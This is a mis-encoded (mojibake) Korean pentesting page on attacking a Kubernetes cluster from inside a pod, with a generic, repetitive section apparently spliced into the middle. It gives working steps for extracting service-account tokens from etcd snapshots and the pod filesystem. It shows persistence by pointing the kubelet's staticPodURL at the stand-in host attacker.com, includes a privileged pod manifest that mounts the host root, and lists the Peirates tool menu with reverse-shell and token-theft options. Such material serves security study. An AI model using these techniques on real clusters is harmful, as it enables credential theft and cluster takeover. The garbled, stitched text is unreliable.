ì˜ˆë¥¼ ë“¤ì–´, `curl` ëª…ë ¹ì„ ì‚¬ìš©í•˜ì—¬ íŠ¹ì • URLì—ì„œ ë°ì´í„°ë¥¼ ê°€ì ¸ì˜¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹¤ìŒ ëª…ë ¹ì„ ì‹¤í–‰í•˜ì—¬ íŠ¹ì • URLì—ì„œ ë°ì´í„°ë¥¼ ê°€ì ¸ì˜¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```bash
$ curl <URL>
```

### 5. Pod ë‚´ë¶€ì—ì„œì˜ ì•…ì„± ì»¨í…Œì´ë„ˆ ì‹¤í–‰

Pod ë‚´ë¶€ì—ì„œ ì‹¤í–‰ë˜ëŠ” ì»¨í…Œì´ë„ˆëŠ” í´ëŸ¬ìŠ¤í„° ë‚´ë¶€ì—ì„œ ì•…ì„± ì»¨í…Œì´ë„ˆë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ì´ìš©í•˜ì—¬ í´ëŸ¬ìŠ¤í„° ë‚´ë¶€ì—ì„œ ì•…ì„± í™œë™ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì˜ˆë¥¼ ë“¤ì–´, `docker run` ëª…ë ¹ì„ ì‚¬ìš©í•˜ì—¬ ì•…ì„± ì»¨í…Œì´ë„ˆë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹¤ìŒ ëª…ë ¹ì„ ì‹¤í–‰í•˜ì—¬ ì•…ì„± ì»¨í…Œì´ë„ˆë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```bash
$ docker run <ì´ë¯¸ì§€>
```

### ê²°ë¡ 

Pod ë‚´ë¶€ì—ì„œ Kubernetes í´ëŸ¬ìŠ¤í„°ë¥¼ ê³µê²©í•˜ëŠ” ê²ƒì€ ë§¤ìš° ìœ„í—˜í•œ ì‘ì—…ì…ë‹ˆë‹¤. ì´ëŸ¬í•œ ê³µê²©ì„ ë°©ì§€í•˜ê¸° ìœ„í•´ Podì˜ ë³´ì•ˆì„ ê°•í™”í•˜ê³  ì ì ˆí•œ ì ‘ê·¼ ì œì–´ë¥¼ êµ¬í˜„í•´ì•¼ í•©ë‹ˆë‹¤.

```bash
data-dir=/var/lib/etcd
```

**etcd ë°ì´í„°ë² ì´ìŠ¤ì˜ ë°ì´í„° ë³´ê¸°:**

```bash
kubectl exec -it <pod_name> -- sh
ETCDCTL_API=3 etcdctl get --prefix "" --keys-only --from-key / | grep -v '\/$'
```

ìœ„ ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•˜ì—¬ etcd ë°ì´í„°ë² ì´ìŠ¤ì—ì„œ ë°ì´í„°ë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```bash
strings /var/lib/etcd/member/snap/db | less
```

**ë°ì´í„°ë² ì´ìŠ¤ì—ì„œ í† í°ì„ ì¶”ì¶œí•˜ê³  ì„œë¹„ìŠ¤ ê³„ì • ì´ë¦„ì„ í‘œì‹œí•©ë‹ˆë‹¤**

```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```

**ë™ì¼í•œ ëª…ë ¹ì–´ì§€ë§Œ kube-system ë„¤ì„ìŠ¤í˜ì´ìŠ¤ì—ì„œ ê¸°ë³¸ í† í°ë§Œ ë°˜í™˜í•˜ëŠ” ëª‡ ê°€ì§€ grepsê°€ ì¶”ê°€ë˜ì—ˆìŠµë‹ˆë‹¤**

```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```

## Pod ë‚´ë¶€ì—ì„œ Kubernetes ê³µê²©í•˜ê¸°

ì´ ë¬¸ì„œì—ì„œëŠ” Kubernetes í´ëŸ¬ìŠ¤í„° ë‚´ë¶€ì—ì„œ Pod ë‚´ë¶€ì—ì„œ ê³µê²©í•˜ëŠ” ë°©ë²•ì— ëŒ€í•´ ì„¤ëª…í•©ë‹ˆë‹¤. ì´ëŸ¬í•œ ê³µê²©ì€ Pod ë‚´ë¶€ì—ì„œ ì‹¤í–‰ë˜ëŠ” ì»¨í…Œì´ë„ˆì˜ ê¶Œí•œì„ ì´ìš©í•˜ì—¬ Kubernetes í´ëŸ¬ìŠ¤í„° ì „ì²´ì— ì•…ì˜í–¥ì„ ë¯¸ì¹  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### 1. Pod ë‚´ë¶€ì—ì„œì˜ ê¶Œí•œ ìƒìŠ¹

Pod ë‚´ë¶€ì—ì„œ ê¶Œí•œ ìƒìŠ¹ì„ ì‹œë„í•˜ëŠ” ì²« ë²ˆì§¸ ë‹¨ê³„ëŠ” í˜„ì¬ ì‹¤í–‰ ì¤‘ì¸ ì»¨í…Œì´ë„ˆì˜ ê¶Œí•œ ìˆ˜ì¤€ì„ í™•ì¸í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. ì´ë¥¼ ìœ„í•´ ë‹¤ìŒ ëª…ë ¹ì„ ì‹¤í–‰í•©ë‹ˆë‹¤.

```bash
$ id
```

ì»¨í…Œì´ë„ˆì˜ ì‚¬ìš©ì IDì™€ ê·¸ë£¹ IDë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ì •ë³´ë¥¼ ì‚¬ìš©í•˜ì—¬ ê¶Œí•œ ìƒìŠ¹ì„ ì‹œë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### 2. Pod ë‚´ë¶€ì—ì„œì˜ í´ëŸ¬ìŠ¤í„° ê¶Œí•œ í™•ì¥

Pod ë‚´ë¶€ì—ì„œ ì‹¤í–‰ë˜ëŠ” ì»¨í…Œì´ë„ˆëŠ” ê¸°ë³¸ì ìœ¼ë¡œ í´ëŸ¬ìŠ¤í„° ë‚´ë¶€ì˜ ë‹¤ë¥¸ ë¦¬ì†ŒìŠ¤ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ëª‡ ê°€ì§€ ë°©ë²•ì„ ì‚¬ìš©í•˜ì—¬ ì´ëŸ¬í•œ ì œí•œì„ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### 2.1. Service Account í† í° íƒˆì·¨

Pod ë‚´ë¶€ì—ì„œ ì‹¤í–‰ë˜ëŠ” ì»¨í…Œì´ë„ˆëŠ” Service Account í† í°ì„ ì‚¬ìš©í•˜ì—¬ í´ëŸ¬ìŠ¤í„° ë¦¬ì†ŒìŠ¤ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ í† í°ì„ íƒˆì·¨í•˜ì—¬ í´ëŸ¬ìŠ¤í„° ê¶Œí•œì„ í™•ì¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```bash
$ cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

ìœ„ ëª…ë ¹ì„ ì‹¤í–‰í•˜ì—¬ Service Account í† í°ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### 2.2. í´ëŸ¬ìŠ¤í„° DNS íƒˆì·¨

Pod ë‚´ë¶€ì—ì„œ ì‹¤í–‰ë˜ëŠ” ì»¨í…Œì´ë„ˆëŠ” í´ëŸ¬ìŠ¤í„° DNSì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ í†µí•´ í´ëŸ¬ìŠ¤í„° ë‚´ë¶€ì˜ ë‹¤ë¥¸ ë¦¬ì†ŒìŠ¤ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```bash
$ cat /etc/resolv.conf
```

ìœ„ ëª…ë ¹ì„ ì‹¤í–‰í•˜ì—¬ í´ëŸ¬ìŠ¤í„° DNS ì„œë²„ì˜ IP ì£¼ì†Œë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### 3. Pod ë‚´ë¶€ì—ì„œì˜ ì»¨í…Œì´ë„ˆ ê°„ ê³µê²©

Pod ë‚´ë¶€ì—ì„œ ì‹¤í–‰ë˜ëŠ” ì»¨í…Œì´ë„ˆëŠ” ë™ì¼í•œ ë„¤íŠ¸ì›Œí¬ ë„¤ì„ìŠ¤í˜ì´ìŠ¤ì™€ IPC ë„¤ì„ìŠ¤í˜ì´ìŠ¤ë¥¼ ê³µìœ í•©ë‹ˆë‹¤. ì´ë¥¼ ì´ìš©í•˜ì—¬ ë‹¤ë¥¸ ì»¨í…Œì´ë„ˆì— ëŒ€í•œ ê³µê²©ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### 3.1. IPC ë„¤ì„ìŠ¤í˜ì´ìŠ¤ ê³µìœ 

```bash
$ ls -l /proc/1/ns/ipc
```

ìœ„ ëª…ë ¹ì„ ì‹¤í–‰í•˜ì—¬ í˜„ì¬ ì»¨í…Œì´ë„ˆì˜ IPC ë„¤ì„ìŠ¤í˜ì´ìŠ¤ë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ì •ë³´ë¥¼ ì‚¬ìš©í•˜ì—¬ ë‹¤ë¥¸ ì»¨í…Œì´ë„ˆì˜ IPC ë„¤ì„ìŠ¤í˜ì´ìŠ¤ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### 3.2. ë„¤íŠ¸ì›Œí¬ ë„¤ì„ìŠ¤í˜ì´ìŠ¤ ê³µìœ 

```bash
$ ls -l /proc/1/ns/net
```

ìœ„ ëª…ë ¹ì„ ì‹¤í–‰í•˜ì—¬ í˜„ì¬ ì»¨í…Œì´ë„ˆì˜ ë„¤íŠ¸ì›Œí¬ ë„¤ì„ìŠ¤í˜ì´ìŠ¤ë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ì •ë³´ë¥¼ ì‚¬ìš©í•˜ì—¬ ë‹¤ë¥¸ ì»¨í…Œì´ë„ˆì˜ ë„¤íŠ¸ì›Œí¬ ë„¤ì„ìŠ¤í˜ì´ìŠ¤ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### 4. Pod ë‚´ë¶€ì—ì„œì˜ ì»¨í…Œì´ë„ˆ ì™¸ë¶€ ê³µê²©

Pod ë‚´ë¶€ì—ì„œ ì‹¤í–‰ë˜ëŠ” ì»¨í…Œì´ë„ˆëŠ” í´ëŸ¬ìŠ¤í„° ì™¸ë¶€ì˜ ë‹¤ë¥¸ ë¦¬ì†ŒìŠ¤ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ì´ìš©í•˜ì—¬ ì™¸ë¶€ ë¦¬ì†ŒìŠ¤ì— ëŒ€í•œ ê³µê²©ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### 4.1. ì™¸ë¶€ ì„œë¹„ìŠ¤ ê³µê²©

Pod ë‚´ë¶€ì—ì„œ ì‹¤í–‰ë˜ëŠ” ì»¨í…Œì´ë„ˆëŠ” ì™¸ë¶€ ì„œë¹„ìŠ¤ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ì™¸ë¶€ ì„œë¹„ìŠ¤ì— ëŒ€í•œ ê³µê²©ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### 4.2. ì™¸ë¶€ ì¸í„°ë„· ê³µê²©

Pod ë‚´ë¶€ì—ì„œ ì‹¤í–‰ë˜ëŠ” ì»¨í…Œì´ë„ˆëŠ” ì™¸ë¶€ ì¸í„°ë„·ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ì™¸ë¶€ ì¸í„°ë„·ì— ëŒ€í•œ ê³µê²©ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### 5. Pod ë‚´ë¶€ì—ì„œì˜ ë°ì´í„° ëˆ„ì¶œ

Pod ë‚´ë¶€ì—ì„œ ì‹¤í–‰ë˜ëŠ” ì»¨í…Œì´ë„ˆëŠ” í´ëŸ¬ìŠ¤í„° ë‚´ë¶€ì˜ ë°ì´í„°ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ì´ìš©í•˜ì—¬ ë°ì´í„°ë¥¼ ëˆ„ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### 5.1. íŒŒì¼ ì‹œìŠ¤í…œ ëˆ„ì¶œ

Pod ë‚´ë¶€ì—ì„œ ì‹¤í–‰ë˜ëŠ” ì»¨í…Œì´ë„ˆëŠ” íŒŒì¼ ì‹œìŠ¤í…œì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ í†µí•´ íŒŒì¼ ì‹œìŠ¤í…œì˜ ë°ì´í„°ë¥¼ ëˆ„ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### 5.2. í™˜ê²½ ë³€ìˆ˜ ëˆ„ì¶œ

Pod ë‚´ë¶€ì—ì„œ ì‹¤í–‰ë˜ëŠ” ì»¨í…Œì´ë„ˆëŠ” í™˜ê²½ ë³€ìˆ˜ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ í†µí•´ í™˜ê²½ ë³€ìˆ˜ì˜ ë°ì´í„°ë¥¼ ëˆ„ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### 5.3. ë¡œê·¸ ëˆ„ì¶œ

Pod ë‚´ë¶€ì—ì„œ ì‹¤í–‰ë˜ëŠ” ì»¨í…Œì´ë„ˆëŠ” ë¡œê·¸ íŒŒì¼ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ë¡œê·¸ íŒŒì¼ì˜ ë°ì´í„°ë¥¼ ëˆ„ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ëŸ¬í•œ ê³µê²© ê¸°ìˆ ì„ ì‚¬ìš©í•˜ì—¬ Pod ë‚´ë¶€ì—ì„œ Kubernetes í´ëŸ¬ìŠ¤í„°ë¥¼ ê³µê²©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì´ëŸ¬í•œ ê³µê²©ì€ í•©ë²•ì ì¸ íœí…ŒìŠ¤íŒ… í™œë™ì˜ ì¼ë¶€ë¡œ ìˆ˜í–‰ë˜ì–´ì•¼ í•˜ë©°, ë¬´ë‹¨ìœ¼ë¡œ ìˆ˜í–‰í•˜ëŠ” ê²ƒì€ ë¶ˆë²•ì…ë‹ˆë‹¤.

```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```

#### ì •ì /ë¯¸ëŸ¬ë§ëœ íŒŒë“œ ì§€ì†ì„±

\_ì •ì  íŒŒë“œ\_ëŠ” API ì„œë²„ê°€ ê´€ì°°í•˜ì§€ ì•Šê³  íŠ¹ì • ë…¸ë“œì˜ kubelet ë°ëª¬ì— ì˜í•´ ì§ì ‘ ê´€ë¦¬ë©ë‹ˆë‹¤. ë°°í¬ì™€ ê°™ì€ ì œì–´ í‰ë©´ì— ì˜í•´ ê´€ë¦¬ë˜ëŠ” íŒŒë“œì™€ ë‹¬ë¦¬, **kubeletì€ ê° ì •ì  íŒŒë“œë¥¼ ê°ì‹œí•˜ê³  ì‹¤íŒ¨ ì‹œ ë‹¤ì‹œ ì‹œì‘í•©ë‹ˆë‹¤**.

ë”°ë¼ì„œ ì •ì  íŒŒë“œëŠ” í•­ìƒ íŠ¹ì • ë…¸ë“œì˜ **í•˜ë‚˜ì˜ Kubeletì— ë°”ì¸ë”©**ë©ë‹ˆë‹¤.

**kubeletì€ ê° ì •ì  íŒŒë“œì— ëŒ€í•´ Kubernetes API ì„œë²„ì— ë¯¸ëŸ¬ íŒŒë“œë¥¼ ìë™ìœ¼ë¡œ ìƒì„±**í•˜ë ¤ê³  ì‹œë„í•©ë‹ˆë‹¤. ì´ëŠ” ë…¸ë“œì—ì„œ ì‹¤í–‰ë˜ëŠ” íŒŒë“œê°€ API ì„œë²„ì—ì„œ ë³¼ ìˆ˜ ìˆì§€ë§Œ ê±°ê¸°ì—ì„œ ì œì–´í•  ìˆ˜ ì—†ìŒì„ ì˜ë¯¸í•©ë‹ˆë‹¤. íŒŒë“œ ì´ë¦„ì€ ë…¸ë“œ í˜¸ìŠ¤íŠ¸ ì´ë¦„ê³¼ í•˜ì´í”ˆìœ¼ë¡œ ì‹œì‘í•˜ëŠ” ì ‘ë¯¸ì‚¬ê°€ ë¶™ìŠµë‹ˆë‹¤.

{% hint style="danger" %}
ì •ì  íŒŒë“œì˜ **`spec`ì€ ë‹¤ë¥¸ API ê°ì²´ë¥¼ ì°¸ì¡°í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤** (ì˜ˆ: ServiceAccount, ConfigMap, Secret ë“±). ë”°ë¼ì„œ í˜„ì¬ ë…¸ë“œì—ì„œ ì„ì˜ì˜ serviceAccountë¥¼ ì‚¬ìš©í•˜ì—¬ í´ëŸ¬ìŠ¤í„°ë¥¼ ì¹¨í•´í•˜ê¸° ìœ„í•´ ì´ ë™ì‘ì„ ì•…ìš©í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì´ë¥¼ ì‚¬ìš©í•˜ì—¬ ë‹¤ë¥¸ ë„¤ì„ìŠ¤í˜ì´ìŠ¤ì—ì„œ íŒŒë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (í•„ìš”í•œ ê²½ìš°).
{% endhint %}

ë…¸ë“œ í˜¸ìŠ¤íŠ¸ ë‚´ë¶€ì— ìˆë‹¤ë©´ **ìì²´ì ìœ¼ë¡œ ì •ì  íŒŒë“œë¥¼ ìƒì„±**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” **kube-system**ê³¼ ê°™ì€ ë‹¤ë¥¸ ë„¤ì„ìŠ¤í˜ì´ìŠ¤ì— íŒŒë“œë¥¼ ìƒì„±í•  ìˆ˜ ìˆê²Œ í•´ì£¼ë¯€ë¡œ ë§¤ìš° ìœ ìš©í•©ë‹ˆë‹¤.

ì •ì  íŒŒë“œë¥¼ ìƒì„±í•˜ë ¤ë©´ [**ë¬¸ì„œê°€ í° ë„ì›€ì´ ë©ë‹ˆë‹¤**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/). ê¸°ë³¸ì ìœ¼ë¡œ 2ê°€ì§€ê°€ í•„ìš”í•©ë‹ˆë‹¤:

* **kubelet ì„œë¹„ìŠ¤** ë˜ëŠ” **kubelet êµ¬ì„±**([**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration))ì—ì„œ **`--pod-manifest-path=/etc/kubernetes/manifests`** ë§¤ê°œë³€ìˆ˜ë¥¼ êµ¬ì„±í•˜ê³  ì„œë¹„ìŠ¤ë¥¼ ë‹¤ì‹œ ì‹œì‘í•©ë‹ˆë‹¤.
* \*\*`/etc/kubernetes/manifests`\*\*ì˜ **íŒŒë“œ ì •ì˜**ì— ì •ì˜ë¥¼ ìƒì„±í•©ë‹ˆë‹¤.

**ë” ì€ë°€í•œ ë°©ë²•ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:**

* **kubelet** êµ¬ì„± íŒŒì¼ì—ì„œ **`staticPodURL`** ë§¤ê°œë³€ìˆ˜ë¥¼ ìˆ˜ì •í•˜ê³  `staticPodURL: http://attacker.com:8765/pod.yaml`ì™€ ê°™ì´ ì„¤ì •í•©ë‹ˆë‹¤. ì´ë ‡ê²Œ í•˜ë©´ kubelet í”„ë¡œì„¸ìŠ¤ê°€ ì§€ì •ëœ URLì—ì„œ **êµ¬ì„±ì„ ê°€ì ¸ì™€ ì •ì  íŒŒë“œë¥¼ ìƒì„±**í•©ë‹ˆë‹¤.

**ì˜ˆì‹œ**ë¡œ [**ì—¬ê¸°**](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/)ì—ì„œ ê°€ì ¸ì˜¨ **kube-system**ì— íŠ¹ê¶Œ íŒŒë“œë¥¼ ìƒì„±í•˜ê¸° ìœ„í•œ **íŒŒë“œ** êµ¬ì„±ì˜ ì˜ˆì‹œì…ë‹ˆë‹¤.

```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
volumes:
- name: host
hostPath:
path: /
type: Directory
```

#### íŒŒë“œ ì‚­ì œ + ì˜ˆì•½ ë¶ˆê°€ëŠ¥í•œ ë…¸ë“œ

ë§Œì•½ ê³µê²©ìê°€ **ë…¸ë“œë¥¼ ì¹¨í•´**í•˜ê³  ë‹¤ë¥¸ ë…¸ë“œì—ì„œ **íŒŒë“œë¥¼ ì‚­ì œ**í•˜ê³  **ë‹¤ë¥¸ ë…¸ë“œì—ì„œ íŒŒë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ì—†ê²Œ ë§Œë“¤ ìˆ˜ ìˆë‹¤ë©´**, íŒŒë“œëŠ” ì¹¨í•´ëœ ë…¸ë“œì—ì„œ ë‹¤ì‹œ ì‹¤í–‰ë˜ë©° ê·¸ ì•ˆì—ì„œ ì‹¤í–‰ë˜ëŠ” í† í°ì„ **í›”ì¹  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.\
[**ìì„¸í•œ ì •ë³´ëŠ” ì´ ë§í¬ë¥¼ ë”°ë¥´ì„¸ìš”**](abusing-roles-clusterroles-in-kubernetes/#delete-pods-+-unschedulable-nodes).

### ìë™ ë„êµ¬

* [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)

```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```

* [**https://github.com/r0binak/MTKPI**](https://github.com/r0binak/MTKPI)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™‘**](https://peass.creator-spring.com)ì„ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ì„** íŒ”ë¡œìš°í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´ PRì„** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ë°** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github ì €ì¥ì†Œì— ì œì¶œí•˜ì„¸ìš”.**

</details>
